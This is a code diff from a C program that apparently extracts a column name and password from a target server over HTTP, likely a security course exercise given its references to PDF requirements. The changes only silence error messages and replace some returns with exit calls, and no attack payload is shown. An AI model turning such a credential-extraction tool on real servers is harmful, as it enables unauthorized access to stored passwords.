@@ -302,13 +302,13 @@ bool find_column_name(const char *table_name, const char *pattern, char *column_
     
     // Extract column name (max 10 characters per PDF)
     if (!retrieve_complete_string(query, column_name, 10)) {
-        fprintf(stderr, "Error: Could not find column with pattern '%s'\n", pattern);
+        // fprintf(stderr, "Error: Could not find column with pattern '%s'\n", pattern);
         return false;
     }
     
     // Verify we got a result
     if (strlen(column_name) == 0) {
-        fprintf(stderr, "Error: Column name is empty\n");
+        // fprintf(stderr, "Error: Column name is empty\n");
         return false;
     }
     
@@ -325,8 +325,8 @@ int create_socket_connection(void) {
     // Create TCP socket (IPv4, stream-based)
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0) {
-        fprintf(stderr, "Error: Socket creation failed\n");
-        return -1;
+        // fprintf(stderr, "Error: Socket creation failed\n");
+        exit(1);
     }
     
     // Server address structure
@@ -340,16 +340,16 @@ int create_socket_connection(void) {
     
     // Convert IP address string to binary form
     if (inet_pton(AF_INET, TARGET_IP, &server_addr.sin_addr) <= 0) {
-        fprintf(stderr, "Error: Invalid IP address\n");
+        // fprintf(stderr, "Error: Invalid IP address\n");
         close(sockfd);
-        return -1;
+        exit(1);
     }
     
     // Establish TCP connection to server
     if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
-        fprintf(stderr, "Error: Connection failed\n");
+        // fprintf(stderr, "Error: Connection failed\n");
         close(sockfd);
-        return -1;
+        exit(1);
     }
     
     return sockfd;
@@ -388,7 +388,7 @@ bool transmit_http_request(int sockfd, const char *request) {
     ssize_t bytes_sent = send(sockfd, request, request_len, 0);
     // Verify all bytes were sent
     if (bytes_sent < 0 || (size_t)bytes_sent != request_len) {
-        fprintf(stderr, "Error: Request transmission failed\n");
+        // fprintf(stderr, "Error: Request transmission failed\n");
         return false;
     }
     return true;
@@ -476,13 +476,13 @@ bool save_password_to_file(const char *password) {
     // Open file for writing
     FILE *file = fopen(filename, "w");
     if (!file) {
-        fprintf(stderr, "Error: File creation failed\n");
+        // fprintf(stderr, "Error: File creation failed\n");
         return false;
     }
     
     // Write password with asterisk delimiters (per PDF requirement)
     if (fprintf(file, "*%s*", password) < 0) {
-        fprintf(stderr, "Error: File write failed\n");
+        // fprintf(stderr, "Error: File write failed\n");
         fclose(file);
         return false;
     }
